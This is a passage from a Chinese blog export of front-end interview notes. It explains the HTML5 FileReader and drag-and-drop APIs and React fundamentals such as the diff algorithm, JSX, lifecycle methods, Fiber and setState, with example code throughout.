files[i] console.log(file.name); &#125; &#125;&lt;/script&gt; Blob对象Blob 表示二进制原始数据，它提供一个 slice方法，可以通过该方法访问到字节内部数据块。事实上，上面的 file对象也继承了这个 Blob 对象。 Blob 对象有两个属性，size属性表示一个 Blob 对象的字节长度，type 属性表示 Blob 的 MIME 类型，如果是未知类型的话，返回一个空字符串。 123456789function showFileName()&#123; let file; const files = document.getElementById('file').files; const len = files.length; for (let i = 0; i &lt; len; i++) &#123; file = files[i] console.log(file.name + '===' + file.size + '===' + file.type); &#125;&#125; 通过对 file.size或者 file.type判断可以进行文件大小与文件类型的限制。另外 HTML5 已经对 file控件添加了 accept属性，企图让 file控件只能接受某种类型的文件。 1&lt;input type="file" id="file" multiple size="80" accept="image/gif"&gt; 这样打开文件的时候就会显示 gif结尾的文件，当然如果你强行传其他类型的也是没有报错的。所以如果要做限制上传文件类型的话要结合 file.type来实现。 FileReader接口主要用来把文件读入内存，并且读取文件中的数据。FileReader 接口有了一个异步 API,使用该 API可以在浏览器主线程中异步访问文件系统，读取文件中的数据。 检查是否可以使用： 123if(!typeof FileReader)&#123; // 浏览器为实现 FileReader 接口&#125; 接口方法 这个接口拥有4个方法，其中三个用来读取文件，另一个用来读取过程中断 方法名 参数 描述 readAsBinaryString file 将文件读取为二进制码 readAsText file,[encoding] 将文件读取为文本 readAsDataURL file 将文件读取为 DataURL abort （none） 中断读取操作 readAsBinaryString,这个方法将文件读取为二进制字符串，通常我们把它传送到后端，后端可以通过这段字符串存储文件。 readAsText,有两个参数，第二个参数是文本的编码方式，默认值为 UTF-8。将文件以文本方式读取，读取的结果是这个文本文件中的内容。 readAsDateURL,该方法将文件读取为一串 Data URL字符串，该方法事实上是将小文件以一种特殊格式的URL 地址形式直接读入页面。这里的小文件通常是图像与 html 格式的文件。 接口的事件 除了上面打方法，FileReader 接口还包含了一套完整的事件模型，用于捕获读取文件时的状态。 事件 描述 onabort 数据读取中断时触发 onerror 数据读取出错时触发 onloadstart 数据取数开始时触发 onprogress 数据读取中 onload 数据读取成功完成时触发 onloadend 数据读取完成时触发，无论成功或者失败 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;p&gt;&lt;label for="file"&gt;请选择一个文件&lt;/label&gt;&lt;input type="file" id="file" multiple&gt;&lt;input type="button" onclick="readAsDataURL()" value="读取图像"&gt;&lt;input type="button" onclick="readAsBinaryString()" value="读取二进制数据"&gt;&lt;input type="button" onclick="readAsText()" value="读取文本数据"&gt;&lt;/p&gt;&lt;div name="result" id="result"&gt;&lt;/div&gt;&lt;script&gt;const result = document.getElementById('result');const file = document.getElementById('file');if (!typeof FileReader) &#123; alert('浏览器不支持 FileReader 接口') file.setAttribute('disabled', 'disabled');&#125;function readAsDataURL() &#123; // 检查文件是否为图像 const &#123; files &#125; = file; const len = files.length; for (let i = 0; i &lt; len; i++) &#123; if (!/image\/\w+/.test(files[i].type)) &#123; alert('请确保文件都为图像类型'); return false; &#125; let reader = new FileReader(); // 将文件以 Data URL 形式读入页面 reader.readAsDataURL(files[i]) reader.onload = function (e) &#123; let img = document.createElement('img') img.src = this.result result.appendChild(img) &#125; &#125;&#125;// 将文件以二进制的形式读入页面function readAsBinaryString() &#123; // 检查文件是否为图像 const &#123; files &#125; = file; const len = files.length; for (let i = 0; i &lt; len; i++) &#123; if (!/image\/\w+/.test(files[i].type)) &#123; alert('请确保文件都为图像类型'); return false; &#125; let reader = new FileReader(); // 将文件以 二进制形式读入页面 reader.readAsBinaryString(files[i]) reader.onload = function (e) &#123; let p = document.createElement('p') p.innerHTML += this.result result.appendChild(p) &#125; &#125;&#125;// 将文件以文本形式读入页面function readAsText() &#123; // 检查文件是否为图像 const &#123; files &#125; = file; const len = files.length; for (let i = 0; i &lt; len; i++) &#123; if (!/image\/\w+/.test(files[i].type)) &#123; alert('请确保文件都为图像类型'); return false; &#125; let reader = new FileReader(); // 将文件以 二进制形式读入页面 reader.readAsText(files[i]) reader.onload = function (e) &#123; let p = document.createElement('p') p.innerHTML += this.result result.appendChild(p) &#125; &#125;&#125;&lt;/script&gt; 关于读取状态的先后顺序： 1234567891011121314151617181920212223242526272829function readAsDataURL() &#123; // 检查文件是否为图像 const &#123; files &#125; = file; const len = files.length; for (let i = 0; i &lt; len; i++) &#123; if (!/image\/\w+/.test(files[i].type)) &#123; alert('请确保文件都为图像类型'); return false; &#125; let reader = new FileReader(); // 将文件以 Data URL 形式读入页面 reader.readAsDataURL(files[i]) reader.onload = function (e) &#123; let img = document.createElement('img') img.src = this.result result.appendChild(img) console.log('load') &#125; reader.onprogress = function(e)&#123;console.log('progress');&#125; reader.onabort = function(e)&#123;console.log('abort');&#125; reader.onerror = function(e)&#123;console.log('error');&#125; reader.onloadstart = function(e)&#123;console.log('loadstart');&#125; reader.onloadend = function(e)&#123;console.log('loadend');&#125; &#125;&#125;// loadstart// progress// load// loadend 在 onprogress里面可以用 progress来显示文件读取的百分比。 拖放 API虽然在 HTML5 之前已经可以使用 mousedown、mousemove、mouseup来实现拖放操作，但是这只是在浏览器内容的拖放。在 HTML5 中，支持在浏览器与其他应用程序之间的数据互相拖动，同时也大大简化了拖放方面的代码。 实现拖放的步骤 将想要拖放的对象元素的 draggable属性设为 true，这样才能将该元素进行拖放。另外，img元素与 a 元素默认运行拖放。 编写与拖放有关的代码。 拖放的相关事件 事件 产生事件的元素 描述 drastart 被拖放的元素 开始施放操作 drag 被拖放的元素 拖放过程中 dragenter 拖放过程中鼠标经过的元素 被拖放的元素开始进入本元素的范围 dragover 拖放过程中鼠标经过的元素 被拖放的元素正在本元素范围内移动 dragleave 拖放过程中鼠标经过的元素 被拖放的元素离开本元素的范围 drop 拖放的目标元素 有其他元素被拖放到了本元素中 dragend 拖放的对象元素 拖放操作结束 1234567891011121314151617181920212223242526272829303132333435&lt;body onload="init()"&gt; &lt;h2&gt;简单拖放示例&lt;/h2&gt; &lt;div id="dragme" draggable="true" style="width:200px;border:1px solid gray"&gt; 请拖放 &lt;/div&gt; &lt;div id="text" style="width:200px;height:200px;border:1px solid gray"&gt;&lt;/div&gt; &lt;script&gt; function init() &#123; const source = document.getElementById('dragme'); const dest = document.getElementById('text'); source.addEventListener('dragstart', function (ev) &#123; const dt = ev.dataTransfer; dt.effectAllowed = 'all'; dt.setData('text/plain', '你好') &#125;, false); dest.addEventListener('dragend', function (ev) &#123; // 不执行默认处理（拒绝被拖放） ev.preventDefault(); &#125;); dest.addEventListener('drop', function (ev) &#123; const dt = ev.dataTransfer; const text = dt.getData('text/plain'); dest.textContent += text; ev.preventDefault(); // 禁止事件传播 ev.stopPropagation(); &#125;, false) &#125; // 页面设置属性，不执行默认处理(拒绝被拖放) document.ondragover = function (e) &#123; e.preventDefault() &#125; document.ondrop = function (e) &#123; e.preventDefault() &#125; &lt;/script&gt;&lt;/body&gt; 开始拖动（dragstart事件发生）时，将要拖动的数据存入 DataTransfer对象（setData()方法）。DataTransfer对象专门用来存放拖放时要携带的数据，它可以被设置为拖动事件对象的 dataTransfer属性。setData方法中的第一个参数为携带数据的数据种类的字符串，第二个参数为要修改的数据。第一个参数中表示数据种类的字符串里只能填入类似 text/plain或者text/html的表示 MIME 类型的文字，不能填入其他文字。 如果把dt.setData(&quot;text/plain&quot;,&quot;你好&quot;)改成 dt.setData(&quot;text/plain&quot;,this.id)。因为把被拖动元素的 id 当成了参数，所以携带的数据就是被拖动元素中的数据了，因为浏览器在使用 getData()方法读取数据时会自动读取该元素中的数据。 针对拖放的目标元素，必须在 dragend或者 dragover事件内调用事件对象的 preventDefault()方法。因为默认情况下，被拖放的目标元素不允许接受元素的，为了把元素拖放到其中，必须把默认处理给关闭掉。 目标元素接受到被拖放的元素后，执行 getData方法从 DataTransfer获得数据。getData方法的参数为 setData方法中指定的数据种类 要实现拖放过程，还必须在目标元素的 drop事件中关闭默认处理（拒绝被拖放），否则目标元素不能接受被拖放的元素 实现拖放过程，还必须设定整个页面为不执行默认处理（拒绝被拖放），否则拖放处理也不能被实现。因为页面是先于其他元素接受拖放的，如果页面上拒绝拖放，那么页面上其他元素就都不能接受拖放 要使元素可以被拖放，首先必须把该元素的 draggable属性设为 true，另外，为了让这个示例在所有支持拖放 API 的浏览器中都能正常运行，需要指定 -webkit-user-drag:element这种 Webkit 特有的 CSS 属性 现在支持拖放处理的 MIME 类型主要有一下几种： text/plain:文本文字 text/html：HTML文字 text/xml：xml 文字 text/uri-list：URL 列表，每个 URL 为一行 DataTransfer 对象的属性与方法 属性/方法 描述 dropEffect属性 表示拖放操作的视觉效果，运行对其进行值的设定。该效果必须用 effectAllowed属性置顶的允许的效果范围内。允许指定的值为 none、copy、move、link effectAllowed属性 用来指定当元素被拖放时所运行的视觉效果，可以指定的值为none、copy、copyLink、copyMove、link、linkMove、move、all、unintialize types属性 存入数据的种类，字符串的伪数组 void clearData(DOMString format)方法 清除 DataTransfer 对象中存放的数据，如果省略参数 format,则清除全部数据 void setData(DOMString format、DOMString data) 向 DataTransfer 对象内存入数据 DOMString getData(DOMString format) 从 DataTransfer 对象中读数据 void setDragImage(Element image,long x,long y) 用 img 元素来设置拖放图标（部分浏览器可以用 canvas 等其他元素来设置） 设定拖放时的视觉效果dropEffect与 effectAllowed属性结合起来可以设定拖放时的视觉效果。effectAllowed属性表示当一个元素被拖动时所运行的视觉效果，一般在 ondragstart事件中设定，运行使用的值为 none、copy、copyLink、copyMove、link、move、all、unintialize。 dropEffect属性表示实际拖放时的视觉效果，一般在 ondragover事件中指定，运行设定的值为 none、copy、link、move。dropEffect属性所表示的实际视觉效果必须在 effectAllowed属性所表示的允许的视觉效果范围内。规则如下： 如果 effectAllowed属性被设为 none，则不允许拖放元素。 如果 dropEffect属性设定为 none，则不允许被拖放到目标元素中 effectAllowed属性设定为 all或者不设定，则 dropEffect属性允许被设定为任何值，并按照指定的视觉效果进行显示 如果 effectAllowed属性设定为具体效果（不为 none或者 all），dropEffect属性也设定了具体视觉效果，则两个具体效果值必须完全相等，否则不允许被拖放元素拖放到目标元素中。 1234567891011source.addEventListener('dragstart',function(ev)&#123; const dt = ev.dataTransfer; dt.effectAllowed = 'copy'; dt.setData("text/plain","你好")&#125;,false);dest.addEventListener('dragover',function(ev)&#123; const dt = ev.dataTransfer; dt.dropEffect = 'copy'; ev.preventDefault();&#125;,false); 自定义拖放图标除了上面所说的使用 effectAllowed属性与dropEffect属性外，HTML5 还允许自定义拖放图标——指的是在用鼠标拖动元素的过程中，位于鼠标指针下部的小图标。 setDragImage方法有三个惨呼，第一个参数 image 设定为拖放图标的图标元素，第二个参数 x 为拖放图标离鼠标指针x轴方向的位移量，第三个参数 y 为拖放图标距离鼠标指针的 y 轴方向的位移量。 123456789dragIcon.src = 'http://laibh.top/images/favicon-32x32-next.png?v=5.1.4';source.addEventListener('dragstart', function (ev) &#123;const dt = ev.dataTransfer;console.log(ev)console.log(dt)dt.effectAllowed = 'all';dt.setDragImage(dragIcon, -10, -10)dt.setData('text/plain', '你好')&#125;, false);]]></content>
      <categories>
        <category>前端面试</category>
      </categories>
      <tags>
        <tag>HTML5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端面试题目汇总摘录（React 基础篇）]]></title>
    <url>%2F%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE%E6%B1%87%E6%80%BB%E6%91%98%E5%BD%95-React%20%E5%9F%BA%E7%A1%80%E7%AF%87.html</url>
    <content type="text"><![CDATA[温故而知新，保持空杯心态 React 基础什么是 React?是一个用于构建用户界面的 javaScript 库，主要用于构建 UI,很多人认为是 MVC 中的 View 层 特点： 声明式设计 – 采用声明范式，可以轻松描述应用 高效 – 通过对 DOM 的模拟，最大限度地减少与 DOM 的交互 灵活 – React 可以与很多库或者框架很好地配合 JSX – JSX 是 javascript 语法的扩展 组件 – 通过 React 构建的组件，使得代码更加容易得到，很好的应用在大项目的开发中 单向响应的数据流 – 减少了重复代码 React的渲染机制React 渲染过程页面打开的时候，React 会调用 render 函数来构建一颗 DOM 树，在 state/props改变的时候， render 函数会再次调用渲染出来另外一颗树，接着， React 会对两棵树进行对比，找出需要更新的地方进行批量改动 Diff 算法作用 计算出 Virtual DOM 中真正变化的部分，并只针对该部分进行原生 DOM 操作，而非重新渲染整个页面。 传统 diff 算法的劣处 通过循环递归节点进行依次对比，算法复杂度达到 O(n^3)，n 是树的节点数。假设展示1000个节点，得执行上亿次比较。CPU 无法进行在很短的时间内计算出差异 React 的 diff 算法 将 Virtual DOM 树转换成为 Actual DOM 树的最少操作过程被称为调和。React 的 diff 算法就是调和的具体实现。 React 的diff 策略 React 用三大策略将 O(n^3)复杂都转换为 O(n)复杂度 策略1（tree diff）: Web UI 中 DOM 节点跨层级的移动操作特别少，可以忽略不计 策略2（component diff）: 拥有相同类的两个组件生成相似的树形结构 拥有不同类的两个组件生成不同的树形结构 策略三（element diff）: 对于同一层级的一组子节点，通过唯一的 id 区分 diff 策略详解 Tree diff React 通过 updateDepth 对 Virtual DOM 树进行层级控制 对树分层比较，两棵树只对同一层次节点进行比较，如果该节点不存在时，则该节点以及其节点会被完全删除，不会再进行进一步比较 只要遍历一次，就能完成整颗 DOM 的比较 如果 DOM 出现了跨层操作，diff 只会简单考虑同层级的节点位置变化，如果是跨层的话，只有创建和删除节点的操作。因此也不建议进行跨 DOM 操作，可以通过 CSS 隐藏、显示节点，而不是真正地移除，添加 DOM 节点 12345678910111213141516updateChildren:function(nextNestedChildrenElements,transaction,context)&#123; updateDepth++; var errorThrow = true; try&#123; this._updateChildren(nextNestedChildrenElements,transaction,context) &#125;finally&#123; updateDepth--; if(updateDepth)&#123; if(errorThrow)&#123; clearQueue(); &#125;else&#123; processQueue(); &#125; &#125; &#125;&#125; Component diff 同一类型的两个组件，按原策略（层级比较）继续比较 Virtual DOM 树即可 同一类型的两个组件，组件 A 变化为 组件 B时，可能 Virtual DOM 没有任何改变，如果知道这一点，可节省大量计算时间。用户可以通过 shouldComponentUpdate() 来判断是否需要判断计算 不同类型的组件，将一个（将被改变的）组件判断为 dirty component(脏组件)，从而替换整个组件的所有节点。 注意：如果组件 A 和 组件 B 的结构相似，但是 React 判断是不同类型的组件，则不会比较其结构，而是删除 组件 A 以及其子节点，创建组件 B 以其子节点。 Element diff 当节点处于同一层级时，diff 提供三个节点操作：删除、插入、移动 插入：组件 C 不在集合 （AB）中,需要插入 删除：组件 D 在集合 （ABD）中，但是集合变成（AB）,D就需要被删除 移动：组件 D 已经在集合（ABCD）中，且集合更新时，D 没有发生更新，只是位置的改变，如新的集合（ADBC）。D 在第二个，无须像传统的 diff,让旧集合的第二个 B 和新集合的比较，并且删除第二个位置的 B，再在第二个位置插入 D 。需要做的是（对同一层级的同组子节点）添加唯一的 key 进行区分，移动即可。 移动逻辑详解 情形一：新旧集合中存在相同节点但是位置不同时，如何移动节点 lastIndex有点像浮标，或者一个 map 的索引，默认值是 0，会与 map 中的元素进行比较后改变自己的值（取 index和 lastIndex中的较大值） B，React 在新中取得 ,判断旧中是否存在相同的节点B,发现节点B后判断是否需要移动B。 B 在旧中 index = 1,它 的 lastIndex = 0 不满足 lastIndex &gt; index，无需移动操作。 lastindex = Math.max(lastindex,index) = 1 A，A在旧的 index=0,此时 lastIndex=1。满足 lastIndex &gt; index，对 A 进行移动到 lastIndex=1。接着操作 lastIndex=Math.max(lastIndex,index)还是等于1 D，同 1，不移动，由于旧的D index=3,lastIndex=1，改 lastIndex=Math.max(lastIndex,index)=3 C,同 2，移动。C在旧的 index=2,满足lastIndex(3)&gt;index，移动 由于 C 已经是最后一个节点了，所以 diff 操作结束 情形二：新集合中有新加入的节点，旧集合中有删除的节点 B,同上理，不移动，更新 lastIndex=1 E,旧集合中没有，在 lastIndex=1上创建E，更新 lastIndex=1 C，C在旧集合中 index=2,不满足lastIndex&gt;index，不移动，更新 lastIndex=Math.max(lastIndex,index)=2 A，旧集合中 index=0，符合 lastIndex&gt;index，移动，lastIndex还是等于 2 新旧集合对比后，再对旧集合遍历。判断新集合中没有，但是旧集合有的元素D，删除 D，diff 操作结束 diff 的不足之处与待优化的地方 情形三：将最后一个元素移动到最前面 D,此时D 不移动，但是因为它的 index 最大的，导致 lastIndex=3，从而使得其他元素的 index &lt; lastIndex，导致都要去移动。 理想的情况是值移动D,不移动 ABC.因此在开发中，应该尽量减少将最后一个节点移动到列表的首部，当节点数量过大或者操作更新过于频繁的时候，会影响到 React 的渲染性能。 React JSXReact 使用 JSX 来替代常规的 javascript,有几个优点： 执行更快，在编译为 javascript 代码后进行了优化 类型安全，在编译过程中就能发现错误 使用 JSX 编写模板简单快速 在 React 应用中，元素是构成 React 的最小单位，JSX 就是用来声明 React 当中的元素。 与浏览器的 DOM 元素不同，React 当中的元素是普通的对象，ReactDOM 可以确保浏览器的数据内容与 React 元素一致。通过 ReactDOM.render将元素渲染到 DOM 节点上。 12const App = &lt;div className="foo " /&gt;ReactDOM.render(&lt;App&gt;,document.getElementById('root')) 原理 如何用 JavaScript 元素来表示一个 DOM 元素的结构: 123456&lt;div class="box" id="content"&gt; &lt;div class="title"&gt; Hello &lt;/div&gt; &lt;button&gt;Click&lt;/button&gt;&lt;/div&gt; 一个 DOM 元素包含的信息其实只有三个：标签、属性，子元素，所以上面的内容可以表示为 12345678910111213&#123; tag:'div', attrs:&#123;className:'box',id:'content'&#125;, children:[&#123; tag:'div', attrs&#123;className:'title'&#125;, children:['Hello'] &#125;,&#123; tag:'button', attrs:null, children:['Click'] &#125;]&#125; 用 javaScript 有个缺点就是内容太长，结构不够清晰，用 HTML 的方式会方便很多。而 React 把 javascript 扩展了一下，让 javascript 能够支持直接在 javascript 代码中编写类似 HTML 标签结构的语法。编译的过程中会把类似 HTML 的 JSX 结构转换成为 javascript 的对象结构。例如下面的代码： 1234567891011121314151617import React,&#123;Component&#125; from 'react';import ReactDOM from 'react-dom';import '/index.css';class MyComponent extends Component&#123; render()&#123; return( &lt;div&gt; &lt;h1 className='title'&gt;React JSX&lt;/h1&gt; &lt;/div&gt; ) &#125;&#125;ReactDOM.render( &lt;MyComponent /&gt;, document.getElememtById('root')) 经过编译后： 1234567891011121314151617181920212223import React,&#123;Component&#125; from 'react';import ReactDOM from 'react-dom';import '/index.css';class MyComponent extends Component&#123; render()&#123; return( React.createElement( 'div', null, React.createElement( 'h1', &#123;className:'title'&#125;, "React JSX" ) ) ) &#125;&#125;ReactDOM.render( React.createElement(MyComponent,null) document.getElememtById('root')) React.createElement 会构建一个 JavaScript 对象来描述 HTML 结构的信息，包括标签名，属性，还有子元素等等。 所谓的JSX 其实就是 JavaScript 对象 React.render功能就是把组件渲染并且构造 DOM 树，然后插入到页面上特定的元素上。 总结过程： 123 Babel 编译 + React.js 构造 ReactDOM.renderJSX -----&gt; JavaScript 对象结构 -----&gt; DOM 元素 -----&gt; 插入页面 React 生命周期函数React v16.0 前的生命周期分成四个阶段 Initialization、Mounting、Updation、Unmounting Initializationsetup props and states 123456import React,&#123;Component&#125; from 'react';class Test extends Component&#123; constructor(props)&#123; super(props) &#125;&#125; Test 类继承 react 的基本类，拥有了 render ，生命周期等等方法可以使用。 super(props)，用来调用基类的构造方法（constructor()），将父组件中的props 注入给子组件，供其读取。 使用ES6 classes构建组件的时候static defaultProps={}其实就是调用内部的getDefaultProps方法。 constructor可以做一些组件初始化的功能，例如初始化 state,就是调用内部的 getIntialState方法 MountinggetDefaultProps =&gt; getInitialState =&gt; componentWillMount =&gt; render =&gt; componentDidMount componentWillMount 在组件挂载到 DOM 之前调用且只会被调用一次，这里调用 setState不会引起组件重新渲染，也可以把这边的内容写在 constructor中。另外 在 React SSR 中，这个生命周期函数很重要。React-Helmet等等插件都是根据这个函数来实现在 Server 插入内容 render 根据组件的 props和 state，返回一个 React 元素，不负责组件的实际渲染工作，之后 React 根据元素去渲染 页面的 DOM 工作。render 是纯函数，不能在里面执行 this.setState，会有改变组件状态的副作用 componentDidMount 组件挂载到 DOM 后调用，且只会被调用一次 Updationprops: componentWillReciveProps =&gt; shouldComponentUpdate =&gt; ComponentWillUpdate =&gt; render =&gt; componentDidUpdate states: shouldComponentUpdate =&gt; componentWillUpdate =&gt; render =&gt; componentDidUpdate 造成组件更新的情况有两类（三种）情况 1.父组件重新 render 父组件重新 render 引起子组件重新 render 的情况有两种 a) 直接使用，每当父组件重新 render 导致 重传 props,子组件将跟着重新渲染，无论 props 知否有变化，可通过 shouldComponentUpdate方法优化 12345678910class Child extends Component&#123; shouldComponentUpdate(nextProps)&#123; // 使用这个方法，可以避免无论 props 是否有更新都会导致组件跟着渲染 if(nextProps.somethings === this.props.somethings)&#123; return false &#125; render()&#123; return &lt;div&gt;&#123;this.props.sometings&#125;&lt;/div&gt; &#125; &#125;&#125; b) 在 componentWillReceiveProps方法中，将 props 换成自己的 state 123456789101112131415class Child extends Component&#123; constructor(props)&#123; super(props); this.state = &#123; sometings:props.somethings &#125; &#125; componentWillReceiveProps(nextProps)&#123; // 父组件重传 props 时会调用这个方法 this.setState(&#123;something:nextProps.somethings&#125;) &#125; render()&#123; return &lt;div&gt;&#123;this.state.sometings&#125;&lt;/div&gt; &#125; &#125; 官网的描述，在 componentWillReceiveProps中调用 this.setState()不会引起第二次渲染 是因为 componentWillReceiveProps中判断 props是否变化了，如果变化了， this.setState将引起 state的变化，从而引起 render，此时就没有必要再做第二次重传 props引起的 render,避免重复做一样的渲染。 2.组件本身调用 setState，无论 state 是否有变化，可通过 shouldComponentUpdate方法优化 123456789101112131415161718192021class Child extends Component&#123; constructor(props)&#123; super(props); this.state = &#123; something:1 &#125; &#125; shouldComponentUpdate(nextState)&#123; // 使用这个方法，可以避免相同 state引起 render if(nextState.something === this.state.something)&#123; return false &#125; &#125; handleClick = ()=&gt;&#123; const preSomething = this.state.something this.setState(&#123;something:preSomething&#125;) &#125; render()&#123; return &lt;div onClick=&#123;this.handleChild&#125;&gt;&#123;this.state.something&#125;&lt;/div&gt; &#125;&#125; componentWillReceviceProps(nextProps) 这个方法只会调用于props 引起的组件更新过程中，参数 nextProps是父组件传给当前组件的新 props。但是父组件 render方法的调用不能保证重传给当前组件的 props 是否有变化，所以在此方法根据 nextProps和 this.props来查明重传的 props是否有变化，以及如果改变了要执行什么，例如根据新的 props调用 this.setState()触发当前组件重新 render shouldComponentUpdate(nextProps,nextState) 通过比较 nextProps，nextState以及 this.state,this.props返回 true 时当前组件将继续执行更新过程，返回 false 当前组件停止更新，从而来减少组件的不必要的渲染，优化组件性能。 componentWillUpdate(nextProps,nextState) 在 调用 render 之前调用，在这里可以执行一些组件更新前的工作，一般比较少用 componentDidUpdate(prevProps,prevState) 这个方法组件更新后调用，可以操作组件更新的 DOM,prevProps，prevState这两个参数是指组件更新前的 props 和 state UnmountingcomponentWillUnMount componentWillUnMount 这个方法在组件被卸载前调用，可以在这里执行一些清理工作。例如组件中使用的定时器，componentDidMount 中手动创建的 DOM 元素等等，可以避免内存泄露 具体实现可以看看这篇文章，一次性搞懂 React 生命周期 React v.16.4 的生命周期图 变更缘故生命周期在React v16 推出 Fiber 后就不合适了，如果开启 async rendering，在 render函数之前的所有函数，都有可能被执行多次。 v.16 前的生命周期中,componentWillMount,componentReceiveProps, shouldComponentUpdate,componentWillUpdate是在 render之前执行的。 开发者如果开启了 async rendering，而且在上述的生命周期方法做 ajax 请求的话，那就将会被无谓多次调用。明显不是我们期望的结果。在 componentWillMount请求 ajax ,不管多快的结果都跟不上首次 render，而且 componentWillMount在服务器渲染也会被调用到，这样的 IO 操作放在 componentDidMount里面更加适合。 禁止不能用比劝导开发者不要这样用更好，所以除了 shouldComponentUpdate，其他在 render函数之前的所有函数 componentWillMount、componentWillReceiveProps，componentWillUpdate都被 getDerivedStateFromProps替代。 就是用一个静态函数 getDerivedStateFromProps来取代被 deprecate的几个生命周期函数，强制开发者在 render之前只做无副作用的操作，而且能做的操作局限在根据 props和 state决定新的 state 官网API-getDerivedStateFromProps() 关于更多 v16.0 刚推出的时候，增加了一个 componentDidCatch 生命周期函数，新引入的两个生命周期函数:getDerivedStateFromProps和 getSnapshotBeforeUpdate getDerivedStateFromProps getDerivedStateFromProps在v.16.3 中只是创建和更新（由父组件引发的）。如果不由父组件引发，这个方法是不会调用的，如自身的 setState 和 forceUpate引发的。 在 v.16.4 中改正了这一点，让 getDerivedStateFromProps 无论是 Mounting 还是 Updating,也无论是因为什么引起的 Updating全部都会被调用。 static getDerivedStateFromProps(props,state)在组件创建时和更新时的 render方法之前调用，它应该返回一个对象来更新状态，或者返回 null 来不更新任何内容 getSnapshotBeforeUpadate getSnapshotBeforeUpdate被调用于 render 之后，可以读取但是无法使用 DOM 的时候。它使得组件可以在可能更改之前从 DOM 中捕获一些信息（例如滚动位置）。这个生命周期返回的任何值都将作为参数传递给 componentDidUpdate 官网的例子： 1234567891011121314151617181920212223242526class ScrollingList extends React.Component&#123; constructor(props)&#123; super(props); this.listRef = React.createRef(); &#125; getSnapshotBeforeUpdate(nextProps,prevState)&#123; // 我们是否要添加新的 items 到列表中，捕获滚动位置以便我们可以稍后整理滚动 if(prevProps.list.length &lt; this.props.list.length)&#123; const list = this.listRef.current; return list.scrollHeight - list.scrollTop &#125; return null; &#125; componentDidUpdate(prevProps,prevState,snapshot)&#123; // 如果我们有 snapshot 值，我们已经添加新的 items，调整滚动以至于这些新的 items，不会将就的 items 推出视图。 if(snapshot)&#123; const list = this.listRef.current; list.scrollTop = list.scrollHeight - snapshot; &#125; &#125; render()&#123; return( &lt;div ref=&#123;this.listRef&#125;&gt;&#123;/* ...contents */&#125;&lt;/div&gt; ) &#125;&#125; 另外可以看看这篇文章，你可能不需要派生状态 React Fiber官方的解释: React Fiber 是对核心算法的一次重新实现 同步更新过程的局限v16 之前，更新过程是同步的，这可能会导致性能问题。 React 决定要加载或者更新组件树的时候，会做很多事情，比如调用各个组件的生命周期函数，计算和对比 Virtual DOM ,最后更新 DOM 树，这整个过程是同步进行的，也就是说只要一个加载或者更新过程开始，那么 React 就会一直更新下去，中途不会停歇。 表面看，这样的设计也是合理的，更新过程中不会有 I/O 操作，完全是 CPU 计算，所以不需异步操作。但是当组件书比较庞大的时候，问题就来了。 例如更新一个组件需要1毫秒，如果有200个组件需要更新，那就有200毫秒。用户在 input 按钮输入一个子，要等待200毫秒才会有反应，造成界面卡顿，带来不好的用户体验。 另外一个生动的比较就是潜水员的比喻，潜水员进行潜水任务，在潜到底的过程中，如果岸上有更加优先的任务他是不知道的，只有当他重新浮出水面才能去执行优先级更高的任务。 因为 javascript 单线程的特点，每个同步任务的耗时不能太长，不然就会让程序不会对其他输入做出反应，React 的更新就是犯了这个禁止，而 React Fiber 是要改变现状。 React Fiber分片是破解 Javascript 同步操作时间过长的方法。 把一个耗时长的任务分成很多小片，每一个小片的运行时间都很短，虽然总时间依然很长，但是在每个小片执行之后，都给其他任务一个执行的机会，这样唯一的线程就不会被独占，其他任务依然有运行的时间。 React Fiber 把更新过程碎片化，每执行一段更新过程，就把控制权交还给 React 负责任务协调的模块，看看有没有其他紧急任务要做，如果没有就继续去更新，如果有紧急任务，那就去做紧急任务。 维护每一个分片的数据结构，就是 Fiber 为什么叫 Fiber在计算机科学中，Fiber 的含义是 “纤维”，意指比 Thread(线程) 更细的线，也就是比线程控制更精密的并发处理机制。 React Fiber 对现有代码的影响在 React Fiber 中，一次更新过程会分成多个分片完成，所以完全可能一个更新任务还没有完成，会被另一个更高优先级的更新过程打断，这时候，优先级的更新任务会优先处理完，而低优先级更新任务所做的工作则会完全作废，然后等待机会重头再来。 因为一个更新过程可能会被打断，所以 React Fiber 更新过程会被分成两个阶段（Phase）：第一个阶段 Reconciliation 和 第二个阶段 Commit Phase. 在第一个阶段中，React Fiber 会找出需要更新哪些 DOM,这个阶段可以被打断，但是到了第二个阶段，那就是一鼓作气把 DOM 更新完成，不会被打断。 这两个阶段大部分工作是结合 React Fiber 和 生命周期函数。 以 render 为界，第一个阶段可能会调用下面这些生命周期函数： componentWillMount componentWillReceiveProps shouldComponentUpdate componentWillUpdate 下面这些生命周期函数则会在第二个阶段调用 componentDidMount componentDidUpdate componentWillUnmount 因为第一个阶段会被打断，重新再来，会造成意想不到的情况。 比如说，一个低优先级的任务 A 正在执行，已经调用了某个组件的 componentWillUpdate函数，接下来发现自己的时间分片已经用完了，于是冒出水面，看看有没有紧急任务，发现有个紧急任务B，接下来 React Fiber 就去执行这个紧急任务B。任务A 虽然执行了一半，但是没有办法，只能完全放弃，等到任务B 完成后，任务 A 重头来一遍，也就是说 componentWillUpdate函数会被再重新调用一次。 在现有的 React 中，每个生命周期函数在一个加载或者更新过程中决定只会被调用一次，在 React Fiber 中，不再是这样了，第一阶段的声生命周期函数在一次加载和更新过程中可能会被多次调用。 使用 React Fiber 之后，一定要检查一下第一阶段相关的这些生命周期函数，看看有没有逻辑是假设在一个更新过程中只调用一次的，有的话就要改了。 看看可能会重复调用的函数 componentWillReceiveProps即使当前组件不更新，只要父组件更新也会引起和这个函数被调用多次，调用多次无妨 shouldComponentUpdate这个函数的作用是返回一个 true 或者 false，不应该有任何副作用，调用多次无妨 render 是纯函数，调用多次无妨 剩下 componentWillMount 和 componentWillUpdate这两个函数往往包含副作用，所以当使用 React Fiber 的时候一定要重点看这两个函数的实现。 this.setState 异步原因以及更新机制现象在 React 中，如果是由 React 引发的事件处理（比如通过 onClick 引发的合成事件处理）和组件生命周期函数内（比如 componentDidMount），调用 this.setState 不会同步更新 this.state，除此之外的 setState 调用会同步执行 this.state。除此之外指的是绕过 React 通过 addEventListener 直接添加的事件处理函数，还有通过 setTimeout/setInterval 产生的异步调用。另外在合成事件和生命周期函数中的异步调用 setState（比如 ajax 和 setTimeout） 也是会同步更新 